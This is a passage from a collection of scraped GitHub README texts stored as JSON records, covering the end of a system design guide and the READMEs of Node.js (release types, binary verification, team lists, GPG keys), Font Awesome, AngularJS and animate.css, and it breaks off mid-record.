Blog\nLinkedIn Engineering\nMicrosoft Engineering\nMicrosoft Python Engineering\nNetflix Tech Blog\nPaypal Developer Blog\nPinterest Engineering Blog\nQuora Engineering\nReddit Blog\nSalesforce Engineering Blog\nSlack Engineering Blog\nSpotify Labs\nTwilio Engineering Blog\nTwitter Engineering\nUber Engineering Blog\nYahoo Engineering Blog\nYelp Engineering Blog\nZynga Engineering Blog\n\nSource(s) and further reading\nLooking to add a blog?  To avoid duplicating work, consider adding your company blog to the following repo:\n\nkilimchoi/engineering-blogs\n\nUnder development\nInterested in adding a section or helping complete one in-progress?  Contribute!\n\nDistributed computing with MapReduce\nConsistent hashing\nScatter gather\nContribute\n\nCredits\nCredits and sources are provided throughout this repo.\nSpecial thanks to:\n\nHired in tech\nCracking the coding interview\nHigh scalability\ncheckcheckzz/system-design-interview\nshashank88/system_design\nmmcgrana/services-engineering\nSystem design cheat sheet\nA distributed systems reading list\nCracking the system design interview\n\nContact info\nFeel free to contact me to discuss any issues, questions, or comments.\nMy contact info can be found on my GitHub page.\nLicense\nI am providing code and resources in this repository to you under an open source license.  Because this is my personal repository, the license you receive to my code and resources is from me and not my employer (Facebook).\nCopyright 2017 Donne Martin\n\nCreative Commons Attribution 4.0 International License (CC BY 4.0)\n\nhttp://creativecommons.org/licenses/by/4.0/"}, {"title": "nodejs/node", "language": "JavaScript", "content": "Node.js is a JavaScript runtime built on Chrome's V8 JavaScript engine. For\nmore information on using Node.js, see the Node.js Website.\nThe Node.js project uses an open governance model. The\nNode.js Foundation provides support for the project.\nThis project is bound by a Code of Conduct.\nTable of Contents\n\nSupport\nRelease Types\n\nDownload\n\nCurrent and LTS Releases\nNightly Releases\nAPI Documentation\n\n\nVerifying Binaries\n\n\nBuilding Node.js\nSecurity\nCurrent Project Team Members\n\nTSC (Technical Steering Committee)\nCollaborators\nRelease Keys\n\n\nContributing to Node.js\n\nSupport\nNode.js contributors have limited availability to address general support\nquestions. Please make sure you are using a currently-supported version of\nNode.js.\nWhen looking for support, please first search for your question in these venues:\n\nNode.js Website\nNode.js Help\nOpen or closed issues in the Node.js GitHub organization\n\nIf you didn't find an answer in the resources above, try these unofficial\nresources:\n\nQuestions tagged 'node.js' on StackOverflow\n#node.js channel on chat.freenode.net\nNode.js Slack Community\n\nTo register: nodeslackers.com\n\n\n\nGitHub issues are for tracking enhancements and bugs, not general support.\nThe open source license grants you the freedom to use Node.js. It does not\nguarantee commitments of other people's time. Please be respectful and manage\nyour expectations.\nRelease Types\n\nCurrent: Under active development. Code for the Current release is in the\nbranch for its major version number (for example,\nv10.x). Node.js releases a new\nmajor version every 6 months, allowing for breaking changes. This happens in\nApril and October every year. Releases appearing each October have a support\nlife of 8 months. Releases appearing each April convert to LTS (see below)\neach October.\nLTS: Releases that receive Long-term Support, with a focus on stability\nand security. Every even-numbered major version will become an LTS release.\nLTS releases receive 18 months of Active LTS support and a further 12 months\nof Maintenance. LTS release lines have alphabetically-ordered codenames,\nbeginning with v4 Argon. There are no breaking changes or feature additions,\nexcept in some special circumstances.\nNightly: Code from the Current branch built every 24-hours when there are\nchanges. Use with caution.\n\nCurrent and LTS releases follow Semantic Versioning. A\nmember of the Release Team signs each Current and LTS release.\nFor more information, see the\nRelease README.\nDownload\nBinaries, installers, and source tarballs are available at\nhttps://nodejs.org/en/download/.\nCurrent and LTS Releases\nhttps://nodejs.org/download/release/\nThe latest directory is an\nalias for the latest Current release. The latest-codename directory is an\nalias for the latest release from an LTS line. For example, the\nlatest-carbon directory\ncontains the latest Carbon (Node.js 8) release.\nNightly Releases\nhttps://nodejs.org/download/nightly/\nEach directory name and filename contains a date (in UTC time) and the commit\nSHA at the HEAD of the release.\nAPI Documentation\nDocumentation for the latest Current release is at https://nodejs.org/api/.\nVersion-specific documentation is available in each release directory in the\ndocs subdirectory. Version-specific documentation is also at\nhttps://nodejs.org/download/docs/.\nVerifying Binaries\nDownload directories contain a SHASUMS256.txt file with SHA checksums for the\nfiles.\nTo download SHASUMS256.txt using curl:\n$ curl -O https://nodejs.org/dist/vx.y.z/SHASUMS256.txt\nTo check that a downloaded file matches the checksum, run\nit through sha256sum with a command such as:\n$ grep node-vx.y.z.tar.gz SHASUMS256.txt | sha256sum -c -\nFor Current and LTS, the GPG detached signature of SHASUMS256.txt is in\nSHASUMS256.txt.sig. You can use it with gpg to verify the integrity of\nSHASUM256.txt. You will first need to import\nthe GPG keys of individuals authorized to create releases. To\nimport the keys:\n$ gpg --keyserver pool.sks-keyservers.net --recv-keys DD8F2338BAE7501E3DD5AC78C273792F7D83545D\nSee the bottom of this README for a full script to import active release keys.\nNext, download the SHASUMS256.txt.sig for the release:\n$ curl -O https://nodejs.org/dist/vx.y.z/SHASUMS256.txt.sig\nThen use gpg --verify SHASUMS256.txt.sig SHASUMS256.txt to verify\nthe file's signature.\nBuilding Node.js\nSee BUILDING.md for instructions on how to build Node.js from\nsource and a list of supported platforms.\nSecurity\nFor information on reporting security vulnerabilities in Node.js, see\nSECURITY.md.\nCurrent Project Team Members\nFor information about the governance of the Node.js project, see\nGOVERNANCE.md.\nTSC (Technical Steering Committee)\n\naddaleax -\nAnna Henningsen <anna@addaleax.net> (she/her)\napapirovski -\nAnatoli Papirovski <apapirovski@mac.com> (he/him)\nChALkeR -\n\u0421\u043a\u043e\u0432\u043e\u0440\u043e\u0434\u0430 \u041d\u0438\u043a\u0438\u0442\u0430 \u0410\u043d\u0434\u0440\u0435\u0435\u0432\u0438\u0447 <chalkerx@gmail.com> (he/him)\ncjihrig -\nColin Ihrig <cjihrig@gmail.com> (he/him)\ndanbev -\nDaniel Bevenius <daniel.bevenius@gmail.com> (he/him)\nfhinkel -\nFranziska Hinkelmann <franziska.hinkelmann@gmail.com> (she/her)\nFishrock123 -\nJeremiah Senkpiel <fishrock123@rocketmail.com>\ngabrielschulhof -\nGabriel Schulhof <gabriel.schulhof@intel.com>\ngireeshpunathil -\nGireesh Punathil <gpunathi@in.ibm.com> (he/him)\njasnell -\nJames M Snell <jasnell@gmail.com> (he/him)\njoyeecheung -\nJoyee Cheung <joyeec9h3@gmail.com> (she/her)\nmcollina -\nMatteo Collina <matteo.collina@gmail.com> (he/him)\nmhdawson -\nMichael Dawson <michael_dawson@ca.ibm.com> (he/him)\nMylesBorins -\nMyles Borins <myles.borins@gmail.com> (he/him)\nsam-github -\nSam Roberts <vieuxtech@gmail.com>\ntargos -\nMicha\u00ebl Zasso <targos@protonmail.com> (he/him)\nthefourtheye -\nSakthipriyan Vairamani <thechargingvolcano@gmail.com> (he/him)\nTrott -\nRich Trott <rtrott@gmail.com> (he/him)\n\nTSC Emeriti\n\nbnoordhuis -\nBen Noordhuis <info@bnoordhuis.nl>\nchrisdickinson -\nChris Dickinson <christopher.s.dickinson@gmail.com>\nevanlucas -\nEvan Lucas <evanlucas@me.com> (he/him)\ngibfahn -\nGibson Fahnestock <gibfahn@gmail.com> (he/him)\nindutny -\nFedor Indutny <fedor.indutny@gmail.com>\nisaacs -\nIsaac Z. Schlueter <i@izs.me>\njoshgav -\nJosh Gavant <josh.gavant@outlook.com>\nmscdex -\nBrian White <mscdex@mscdex.net>\nnebrius -\nBryan Hughes <bryan@nebri.us>\nofrobots -\nAli Ijaz Sheikh <ofrobots@google.com> (he/him)\norangemocha -\nAlexis Campailla <orangemocha@nodejs.org>\npiscisaureus -\nBert Belder <bertbelder@gmail.com>\nrvagg -\nRod Vagg <r@va.gg>\nshigeki -\nShigeki Ohtsu <ohtsu@ohtsu.org> (he/him)\nTimothyGu -\nTiancheng \"Timothy\" Gu <timothygu99@gmail.com> (he/him)\ntrevnorris -\nTrevor Norris <trev.norris@gmail.com>\n\nCollaborators\n\naddaleax -\nAnna Henningsen <anna@addaleax.net> (she/her)\nak239 -\nAleksei Koziatinskii <ak239spb@gmail.com>\nAndreasMadsen -\nAndreas Madsen <amwebdk@gmail.com> (he/him)\nantsmartian -\nAnto Aravinth <anto.aravinth.cse@gmail.com> (he/him)\napapirovski -\nAnatoli Papirovski <apapirovski@mac.com> (he/him)\naqrln -\nAlexey Orlenko <eaglexrlnk@gmail.com> (he/him)\nbcoe -\nBen Coe <bencoe@gmail.com> (he/him)\nbengl -\nBryan English <bryan@bryanenglish.com> (he/him)\nbenjamingr -\nBenjamin Gruenbaum <benjamingr@gmail.com>\nBethGriggs -\nBeth Griggs <Bethany.Griggs@uk.ibm.com> (she/her)\nbmeck -\nBradley Farias <bradley.meck@gmail.com>\nbmeurer -\nBenedikt Meurer <benedikt.meurer@gmail.com>\nbnoordhuis -\nBen Noordhuis <info@bnoordhuis.nl>\nboneskull -\nChristopher Hiller <boneskull@boneskull.com> (he/him)\nbrendanashworth -\nBrendan Ashworth <brendan.ashworth@me.com>\nBridgeAR -\nRuben Bridgewater <ruben@bridgewater.de> (he/him)\nbzoz -\nBartosz Sosnowski <bartosz@janeasystems.com>\ncalvinmetcalf -\nCalvin Metcalf <calvin.metcalf@gmail.com>\ncclauss -\nChristian Clauss <cclauss@me.com> (he/him)\nChALkeR -\n\u0421\u043a\u043e\u0432\u043e\u0440\u043e\u0434\u0430 \u041d\u0438\u043a\u0438\u0442\u0430 \u0410\u043d\u0434\u0440\u0435\u0435\u0432\u0438\u0447 <chalkerx@gmail.com> (he/him)\nchrisdickinson -\nChris Dickinson <christopher.s.dickinson@gmail.com>\ncjihrig -\nColin Ihrig <cjihrig@gmail.com> (he/him)\nclaudiorodriguez -\nClaudio Rodriguez <cjrodr@yahoo.com>\ncodebytere -\nShelley Vohr <codebytere@gmail.com> (she/her)\ndanbev -\nDaniel Bevenius <daniel.bevenius@gmail.com> (he/him)\nDavidCai1993 -\nDavid Cai <davidcai1993@yahoo.com> (he/him)\ndavisjam -\nJamie Davis <davisjam@vt.edu> (he/him)\ndevsnek -\nGus Caplan <me@gus.host> (he/him)\ndigitalinfinity -\nHitesh Kanwathirtha <digitalinfinity@gmail.com> (he/him)\nedsadr -\nAdrian Estrada <edsadr@gmail.com> (he/him)\neljefedelrodeodeljefe -\nRobert Jefe Lindstaedt <robert.lindstaedt@gmail.com>\nestliberitas -\nAlexander Makarenko <estliberitas@gmail.com>\neugeneo -\nEugene Ostroukhov <eostroukhov@google.com>\nevanlucas -\nEvan Lucas <evanlucas@me.com> (he/him)\nfhinkel -\nFranziska Hinkelmann <franziska.hinkelmann@gmail.com> (she/her)\nfiredfox -\nDaniel Wang <wangyang0123@gmail.com>\nFishrock123 -\nJeremiah Senkpiel <fishrock123@rocketmail.com>\ngabrielschulhof -\nGabriel Schulhof <gabriel.schulhof@intel.com>\ngdams -\nGeorge Adams <george.adams@uk.ibm.com> (he/him)\ngeek -\nWyatt Preul <wpreul@gmail.com>\ngibfahn -\nGibson Fahnestock <gibfahn@gmail.com> (he/him)\ngireeshpunathil -\nGireesh Punathil <gpunathi@in.ibm.com> (he/him)\nguybedford -\nGuy Bedford <guybedford@gmail.com> (he/him)\nhashseed -\nYang Guo <yangguo@chromium.org> (he/him)\nhiroppy -\nYuta Hiroto <hello@hiroppy.me> (he/him)\niarna -\nRebecca Turner <me@re-becca.org>\nimyller -\nIlkka Myller <ilkka.myller@nodefield.com>\nindutny -\nFedor Indutny <fedor.indutny@gmail.com>\nitaloacasas -\nItalo A. Casas <me@italoacasas.com> (he/him)\nJacksonTian -\nJackson Tian <shyvo1987@gmail.com>\njasnell -\nJames M Snell <jasnell@gmail.com> (he/him)\njasongin -\nJason Ginchereau <jasongin@microsoft.com>\njbergstroem -\nJohan Bergstr\u00f6m <bugs@bergstroem.nu>\njdalton -\nJohn-David Dalton <john.david.dalton@gmail.com>\njhamhader -\nYuval Brik <yuval@brik.org.il>\njkrems -\nJan Krems <jan.krems@gmail.com> (he/him)\njoaocgreis -\nJo\u00e3o Reis <reis@janeasystems.com>\njoshgav -\nJosh Gavant <josh.gavant@outlook.com>\njoyeecheung -\nJoyee Cheung <joyeec9h3@gmail.com> (she/her)\njulianduque -\nJulian Duque <julianduquej@gmail.com> (he/him)\nJungMinu -\nMinwoo Jung <minwoo@nodesource.com> (he/him)\nkfarnung -\nKyle Farnung <kfarnung@microsoft.com> (he/him)\nkunalspathak -\nKunal Pathak <kunal.pathak@microsoft.com>\nlance -\nLance Ball <lball@redhat.com> (he/him)\nLeko -\nShingo Inoue <leko.noor@gmail.com> (he/him)\nlpinca -\nLuigi Pinca <luigipinca@gmail.com> (he/him)\nlucamaraschi -\nLuca Maraschi <luca.maraschi@gmail.com> (he/him)\nlundibundi -\nDenys Otrishko <shishugi@gmail.com> (he/him)\nmaclover7 -\nJon Moss <me@jonathanmoss.me> (he/him)\nmafintosh\nMathias Buus <mathiasbuus@gmail.com> (he/him)\nmcollina -\nMatteo Collina <matteo.collina@gmail.com> (he/him)\nmhdawson -\nMichael Dawson <michael_dawson@ca.ibm.com> (he/him)\nmisterdjules -\nJulien Gilli <jgilli@nodejs.org>\nmmarchini -\nMatheus Marchini <mat@mmarchini.me>\nMoonBall -\nChen Gang <gangc.cxy@foxmail.com>\nmscdex -\nBrian White <mscdex@mscdex.net>\nMylesBorins -\nMyles Borins <myles.borins@gmail.com> (he/him)\nnot-an-aardvark -\nTeddy Katz <teddy.katz@gmail.com> (he/him)\nofrobots -\nAli Ijaz Sheikh <ofrobots@google.com> (he/him)\noyyd -\nOuyang Yadong <oyydoibh@gmail.com> (he/him)\nprincejwesley -\nPrince John Wesley <princejohnwesley@gmail.com>\npsmarshall -\nPeter Marshall <petermarshall@chromium.org> (he/him)\nQard -\nStephen Belanger <admin@stephenbelanger.com> (he/him)\nrefack -\nRefael Ackermann <refack@gmail.com> (he/him)\nrichardlau -\nRichard Lau <riclau@uk.ibm.com>\nronkorving -\nRon Korving <ron@ronkorving.nl>\nRReverser -\nIngvar Stepanyan <me@rreverser.com>\nrubys -\nSam Ruby <rubys@intertwingly.net>\nrvagg -\nRod Vagg <rod@vagg.org>\nryzokuken -\nUjjwal Sharma <usharma1998@gmail.com> (he/him)\nsaghul -\nSa\u00fal Ibarra Corretg\u00e9 <saghul@gmail.com>\nsam-github -\nSam Roberts <vieuxtech@gmail.com>\nsantigimeno -\nSantiago Gimeno <santiago.gimeno@gmail.com>\nsebdeckers -\nSebastiaan Deckers <sebdeckers83@gmail.com>\nseishun -\nNikolai Vavilov <vvnicholas@gmail.com>\nshigeki -\nShigeki Ohtsu <ohtsu@ohtsu.org> (he/him)\nshisama -\nMasashi Hirano <shisama07@gmail.com> (he/him)\nsilverwind -\nRoman Reiss <me@silverwind.io>\nsrl295 -\nSteven R Loomis <srloomis@us.ibm.com>\nstarkwang -\nWeijia Wang <starkwang@126.com>\ntargos -\nMicha\u00ebl Zasso <targos@protonmail.com> (he/him)\nthefourtheye -\nSakthipriyan Vairamani <thechargingvolcano@gmail.com> (he/him)\nthekemkid -\nGlen Keane <glenkeane.94@gmail.com> (he/him)\nthlorenz -\nThorsten Lorenz <thlorenz@gmx.de>\nTimothyGu -\nTiancheng \"Timothy\" Gu <timothygu99@gmail.com> (he/him)\ntniessen -\nTobias Nie\u00dfen <tniessen@tnie.de>\ntrevnorris -\nTrevor Norris <trev.norris@gmail.com>\ntrivikr -\nTrivikram Kamat <trivikr.dev@gmail.com>\nTrott -\nRich Trott <rtrott@gmail.com> (he/him)\nvdeturckheim -\nVladimir de Turckheim <vlad2t@hotmail.com> (he/him)\nvkurchatkin -\nVladimir Kurchatkin <vladimir.kurchatkin@gmail.com>\nwatilde -\nDaijiro Wachi <daijiro.wachi@gmail.com> (he/him)\nwatson -\nThomas Watson <w@tson.dk>\nwhitlockjc -\nJeremy Whitlock <jwhitlock@apache.org>\nXadillaX -\nKhaidi Chu <i@2333.moe> (he/him)\nyhwang -\nYihong Wang <yh.wang@ibm.com>\nyorkie -\nYorkie Liu <yorkiefixer@gmail.com>\nyosuke-furukawa -\nYosuke Furukawa <yosuke.furukawa@gmail.com>\nZYSzys -\nYongsheng Zhang <zyszys98@gmail.com> (he/him)\n\nCollaborator Emeriti\n\nandrasq -\nAndras <andras@kinvey.com>\nAnnaMag -\nAnna M. Kedzierska <anna.m.kedzierska@gmail.com>\nimran-iq -\nImran Iqbal <imran@imraniqbal.org>\nisaacs -\nIsaac Z. Schlueter <i@izs.me>\nlxe -\nAleksey Smolenchuk <lxe@lxe.co>\nmatthewloring -\nMatthew Loring <mattloring@google.com>\nmicnic -\nNicu Micleu\u0219anu <micnic90@gmail.com> (he/him)\nmikeal -\nMikeal Rogers <mikeal.rogers@gmail.com>\nmonsanto -\nChristopher Monsanto <chris@monsan.to>\nOlegas -\nOleg Elifantiev <oleg@elifantiev.ru>\norangemocha -\nAlexis Campailla <orangemocha@nodejs.org>\nothiym23 -\nForrest L Norvell <ogd@aoaioxxysz.net> (he/him)\npetkaantonov -\nPetka Antonov <petka_antonov@hotmail.com>\nphillipj -\nPhillip Johnsen <johphi@gmail.com>\npiscisaureus -\nBert Belder <bertbelder@gmail.com>\npmq20 -\nMinqi Pan <pmq2001@gmail.com>\nrlidwka -\nAlex Kocharin <alex@kocharin.ru>\nrmg -\nRyan Graham <r.m.graham@gmail.com>\nrobertkowalski -\nRobert Kowalski <rok@kowalski.gd>\nromankl -\nRoman Klauke <romaaan.git@gmail.com>\nstefanmb -\nStefan Budeanu <stefan@budeanu.com>\ntellnes -\nChristian Tellnes <christian@tellnes.no>\ntunniclm -\nMike Tunnicliffe <m.j.tunnicliffe@gmail.com>\nvsemozhetbyt -\nVse Mozhet Byt <vsemozhetbyt@gmail.com> (he/him)\n\nCollaborators follow the COLLABORATOR_GUIDE.md in\nmaintaining the Node.js project.\nRelease Keys\nGPG keys used to sign Node.js releases:\n\nBeth Griggs <bethany.griggs@uk.ibm.com>\n4ED778F539E3634C779C87C6D7062848A1AB005C\nColin Ihrig <cjihrig@gmail.com>\n94AE36675C464D64BAFA68DD7434390BDBE9B9C5\nEvan Lucas <evanlucas@me.com>\nB9AE9905FFD7803F25714661B63B535A4C206CA9\nGibson Fahnestock <gibfahn@gmail.com>\n77984A986EBC2AA786BC0F66B01FBB92821C587A\nJames M Snell <jasnell@keybase.io>\n71DCFD284A79C3B38668286BC97EC7A07EDE3FC1\nJeremiah Senkpiel <fishrock@keybase.io>\nFD3A5288F042B6850C66B31F09FE44734EB7990E\nMicha\u00ebl Zasso <targos@protonmail.com>\n8FCCA13FEF1D0C2E91008E09770F7A9A5AE15600\nMyles Borins <myles.borins@gmail.com>\nC4F0DFFF4E8C1A8236409D08E73BC641CC11F4C8\nRod Vagg <rod@vagg.org>\nDD8F2338BAE7501E3DD5AC78C273792F7D83545D\nRuben Bridgewater <ruben@bridgewater.de>\nA48C2BEE680E841632CD4E44F07496B3EB3C1762\nShelley Vohr <shelley.vohr@gmail.com>\nB9E2F5981AA6E0CD28160D9FF13993A75599653C\n\nTo import the full set of trusted release keys:\ngpg --keyserver pool.sks-keyservers.net --recv-keys 4ED778F539E3634C779C87C6D7062848A1AB005C\ngpg --keyserver pool.sks-keyservers.net --recv-keys B9E2F5981AA6E0CD28160D9FF13993A75599653C\ngpg --keyserver pool.sks-keyservers.net --recv-keys 94AE36675C464D64BAFA68DD7434390BDBE9B9C5\ngpg --keyserver pool.sks-keyservers.net --recv-keys B9AE9905FFD7803F25714661B63B535A4C206CA9\ngpg --keyserver pool.sks-keyservers.net --recv-keys 77984A986EBC2AA786BC0F66B01FBB92821C587A\ngpg --keyserver pool.sks-keyservers.net --recv-keys 71DCFD284A79C3B38668286BC97EC7A07EDE3FC1\ngpg --keyserver pool.sks-keyservers.net --recv-keys FD3A5288F042B6850C66B31F09FE44734EB7990E\ngpg --keyserver pool.sks-keyservers.net --recv-keys 8FCCA13FEF1D0C2E91008E09770F7A9A5AE15600\ngpg --keyserver pool.sks-keyservers.net --recv-keys C4F0DFFF4E8C1A8236409D08E73BC641CC11F4C8\ngpg --keyserver pool.sks-keyservers.net --recv-keys DD8F2338BAE7501E3DD5AC78C273792F7D83545D\ngpg --keyserver pool.sks-keyservers.net --recv-keys A48C2BEE680E841632CD4E44F07496B3EB3C1762\nSee the section above on Verifying Binaries for how to\nuse these keys to verify a downloaded file.\nOther keys used to sign some previous releases:\n\nChris Dickinson <christopher.s.dickinson@gmail.com>\n9554F04D7259F04124DE6B476D5A82AC7E37093B\nIsaac Z. Schlueter <i@izs.me>\n93C7E9E91B49E432C2F75674B0A78B0A6C481CF6\nItalo A. Casas <me@italoacasas.com>\n56730D5401028683275BD23C23EFEFE93C4CFFFE\nJulien Gilli <jgilli@fastmail.fm>\n114F43EE0176B71C7BC219DD50A3051F888C628D\nTimothy J Fontaine <tjfontaine@gmail.com>\n7937DFD2AB06298B2293C3187D33FF9D0246406D\n\nContributing to Node.js\n\nContributing to the project\nWorking Groups\nStrategic Initiatives"}, {"title": "FortAwesome/Font-Awesome", "language": "JavaScript", "content": "Version 5 \u2013 the iconic SVG, font, and CSS framework\n\nThe internet's most popular icon toolkit has been redesigned and built from\nscratch. On top of this, features like icon font ligatures, an SVG framework,\nofficial NPM packages for popular frontend libraries like React, and access to\na new CDN.\nNot familiar with Font Awesome 5? Learn\nmore about our\nsuccessful Kickstarter and plan. You can also order Font Awesome\nPro which includes tons more icons directly\nfrom fontawesome.com.\nDocumentation\nLearn how to get started with Font Awesome and then dive deeper into other and advanced topics:\nUsing Font Awesome on the Web\n\nWith SVG with JavaScript\nWith web fonts with CSS\nUpgrading from version 4\nInstalling Font Awesome with a package manager\nDownloading + hosting Font Awesome yourself\nPerformance and security\nAccessibility\nTroubleshooting\n\nAdvanced Options & Techniques\n\nUsing CSS pseudo-elements\nSVG sprites\nThe Font Awesome API\nSVG symbols\nSVG JavaScript Core\nServer side rendering\n\nUsing Font Awesome on the Desktop\n\nGetting started\nUpgrading from version 4\nUsing ligatures\nUsing glyphs\nTroubleshooting\n\nWhere did Font Awesome 4 (or 3) go?\nNow that Font Awesome 5 has been released we are marking version 4 as\nend-of-life. We don't plan on releasing any further versions of the 4.x or 3.x.\nDocumentation is still available but it's moved to\nhttps://fontawesome.com/v4.7.0 and\nhttps://fontawesome.com/v3.2.1.\nThe Git repository for\nv4.7.0 and\nv3.2.1 can\nbe found in our GitHub releases.\nChange log\nWe'll keep track of each release in the CHANGELOG.md\nLooking for older versions of Font Awesome? Check the releases.\nUpgrading\nFrom time-to-time we'll have special upgrading instructions from one version to the next.\nCheck out the UPGRADING.md guide when you upgrade your dependencies.\nCode of conduct\nWe will behave ourselves if you behave yourselves. For more details see our\nCODE_OF_CONDUCT.md.\nContributing\nPlease read through our contributing guidelines.  Included\nare directions for opening issues.\nVersioning\nFont Awesome will be maintained under the Semantic Versioning guidelines as much as possible. Releases will be numbered\nwith the following format:\n<major>.<minor>.<patch>\nFor more information on SemVer, please visit http://semver.org.\nThe major version \"5\" is part of an umbrella release.  It includes many different types of files and technologies. Therefore\nwe deviate from normal SemVer in the following ways:\n\nAny release may update the design, look-and-feel, or branding of an existing\nicon\nWe will never intentionally release a patch version update that breaks\nbackward compatibility\nA minor release may include backward-incompatible changes but we will\nwrite clear upgrading instructions in UPGRADING.md\nA minor or patch release will never remove icons\nBug fixes will be addressed as patch releases unless they include backward\nincompatibility then they will be minor releases\n\nLicense\nFont Awesome Free is free, open source, and GPL friendly. You can use it for\ncommercial projects, open source projects, or really almost whatever you want.\n\nIcons \u2014 CC BY 4.0 License\n\nIn the Font Awesome Free download, the CC BY 4.0 license applies to all icons packaged as .svg and .js files types.\n\n\nFonts \u2014 SIL OFL 1.1 License\n\nIn the Font Awesome Free download, the SIL OLF license applies to all icons packaged as web and desktop font files.\n\n\nCode \u2014 MIT License\n\nIn the Font Awesome Free download, the MIT license applies to all non-font and non-icon files.\n\n\n\nAttribution is required by MIT, SIL OLF, and CC BY licenses. Downloaded Font\nAwesome Free files already contain embedded comments with sufficient\nattribution, so you shouldn't need to do anything additional when using these\nfiles normally.\nWe've kept attribution comments terse, so we ask that you do not actively work\nto remove them from files, especially code. They're a great way for folks to\nlearn about Font Awesome.\nTeam\n\nDave Gandy\nTravis Chase\nRob Madole\nBrian Talbot\nJory Raphael\nMike Wilkerson\nGeremia Taglialatela"}, {"title": "angular/angular.js", "language": "JavaScript", "content": "AngularJS \nAngularJS lets you write client-side web applications as if you had a smarter browser.  It lets you\nuse good old HTML (or HAML, Jade/Pug and friends!) as your template language and lets you extend HTML\u2019s\nsyntax to express your application\u2019s components clearly and succinctly.  It automatically\nsynchronizes data from your UI (view) with your JavaScript objects (model) through 2-way data\nbinding. To help you structure your application better and make it easy to test, AngularJS teaches\nthe browser how to do dependency injection and inversion of control.\nIt also helps with server-side communication, taming async callbacks with promises and deferred objects,\nand it makes client-side navigation and deep linking with hashbang urls or HTML5 pushState a\npiece of cake. Best of all? It makes development fun!\n\nOn July 1, 2018 AngularJS entered a 3 year Long Term Support period: Find out more\nLooking for the new Angular? Go here: https://github.com/angular/angular\n\n\nWeb site: https://angularjs.org\nTutorial: https://docs.angularjs.org/tutorial\nAPI Docs: https://docs.angularjs.org/api\nDeveloper Guide: https://docs.angularjs.org/guide\nContribution guidelines: CONTRIBUTING.md\nCore Development: DEVELOPERS.md\nDashboard: https://dashboard.angularjs.org\n\nDocumentation\nGo to https://docs.angularjs.org\nContribute\nWe've set up a separate document for our\ncontribution guidelines.\nDevelop\nWe've set up a separate document for\ndevelopers.\n\nWhat to use AngularJS for and when to use it\nAngularJS is the next generation framework where each component is designed to work with every other\ncomponent in an interconnected way like a well-oiled machine. AngularJS is JavaScript MVC made easy\nand done right. (Well it is not really MVC, read on, to understand what this means.)\nMVC, no, MV* done the right way!\nMVC, short for Model-View-Controller, is a design pattern, i.e. how the code should be organized and\nhow the different parts of an application separated for proper readability and debugging. Model is\nthe data and the database. View is the user interface and what the user sees. Controller is the main\nlink between Model and View. These are the three pillars of major programming frameworks present on\nthe market today. On the other hand AngularJS works on MV*, short for Model-View-Whatever. The\nWhatever is AngularJS's way of telling that you may create any kind of linking between the Model\nand the View here.\nUnlike other frameworks in any programming language, where MVC, the three separate components, each\none has to be written and then connected by the programmer, AngularJS helps the programmer by asking\nhim/her to just create these and everything else will be taken care of by AngularJS.\nInterconnection with HTML at the root level\nAngularJS uses HTML to define the user's interface. AngularJS also enables the programmer to write\nnew HTML tags (AngularJS Directives) and increase the readability and understandability of the HTML\ncode. Directives are AngularJS\u2019s way of bringing additional functionality to HTML. Directives\nachieve this by enabling us to invent our own HTML elements. This also helps in making the code DRY\n(Don't Repeat Yourself), which means once created, a new directive can be used anywhere within the\napplication.\nHTML is also used to determine the wiring of the app. Special attributes in the HTML determine where\nto load the app, which components or controllers to use for each element, etc. We specify \"what\"\ngets loaded, but not \"how\". This declarative approach greatly simplifies app development in a sort\nof WYSIWYG way. Rather than spending time on how the program flows and orchestrating the various\nmoving parts, we simply define what we want and AngularJS will take care of the dependencies.\nData Handling made simple\nData and Data Models in AngularJS are plain JavaScript objects and one can add and change properties\ndirectly on it and loop over objects and arrays at will.\nTwo-way Data Binding\nOne of AngularJS's strongest features. Two-way Data Binding means that if something changes in the\nModel, the change gets reflected in the View instantaneously, and the same happens the other way\naround. This is also referred to as Reactive Programming, i.e. suppose a = b + c is being\nprogrammed and after this, if the value of b and/or c is changed then the value of a will be\nautomatically updated to reflect the change. AngularJS uses its \"scopes\" as a glue between the Model\nand View and makes these updates in one available for the other.\nLess Written Code and Easily Maintainable Code\nEverything in AngularJS is created to enable the programmer to end up writing less code that is\neasily maintainable and readable by any other new person on the team. Believe it or not, one can\nwrite a complete working two-way data binded application in less than 10 lines of code. Try and see\nfor yourself!\nTesting Ready\nAngularJS has Dependency Injection, i.e. it takes care of providing all the necessary dependencies\nto its controllers and services whenever required. This helps in making the AngularJS code ready for\nunit testing by making use of mock dependencies created and injected. This makes AngularJS more\nmodular and easily testable thus in turn helping a team create more robust applications."}, {"title": "daneden/animate.css", "language": "CSS", "content": "Animate.css      \nJust-add-water CSS animation\nanimate.css is a bunch of cool, fun, and cross-browser animations for you to use in your projects. Great for emphasis, home pages, sliders, and general just-add-water-awesomeness.\nInstallation\nInstall via npm:\n$ npm install animate.css --save\nor yarn:\n$ yarn add animate.css\nUsage\nTo use animate.css in your website, simply drop the stylesheet into your document's <head>, and add the class animated to an element, along with any of the animation names. That's it! You've got a CSS animated element. Super!\n<head>\n  <link rel=\"stylesheet\" href=\"animate.min.css\">\n</head>\nor use a CDN hosted version by CDNJS\n<head>\n  <link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css\">\n</head>\nAnimations\nTo animate an element, add the class animated to an element. You can include the class infinite for an infinite loop. Finally you need to add one of the following classes to the element:\n\n\n\nClass 